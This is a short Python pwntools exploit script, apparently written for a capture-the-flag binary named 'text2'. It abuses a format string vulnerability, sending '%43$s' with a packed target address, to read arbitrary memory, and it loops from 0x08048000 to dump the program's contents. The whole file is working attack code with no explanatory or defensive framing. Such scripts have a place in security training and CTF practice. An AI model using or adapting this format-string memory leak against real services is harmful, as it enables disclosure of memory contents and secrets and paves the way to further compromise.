from pwn import *

p = process("./text2")

def read_until(msg):
    out = ''
    while msg not in out:
        out += p.recv(1)
    return out

def dump(addr,frmt='p'):
    raw_adr = p32(addr)
    if "\n" in raw_adr:
        return ("","")
    leak = "%43${}|".format(frmt)
    out = leak.ljust(137,"A") + "EOF_txt" + raw_adr
    p.sendline(out+"\n")
    r = read_until("EOF_txt")
    fr = '''Type anything!
    > '''
    bk = "|AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEOF_txt"
    return r.lstrip(fr).rstrip(bk), r.replace("\n\nType anything!\n> \n\nType anything!\n> ","")

# print dump(0x08048000,"p")
# print dump(0x08048000,"s")
addr = 0x08048000
while True:
    with open('dump.raw','w') as f:
        print '[*] leak 0x{:08x}'.format(addr)
        leak = (dump(addr,'s')[0]+'\x00').replace("\n\nType anything!\n> \n\nType anything!\n> ","")
        addr += len(leak)
        print " --> {}".format(repr(leak))
        # f.write(leak)
        # f.flush()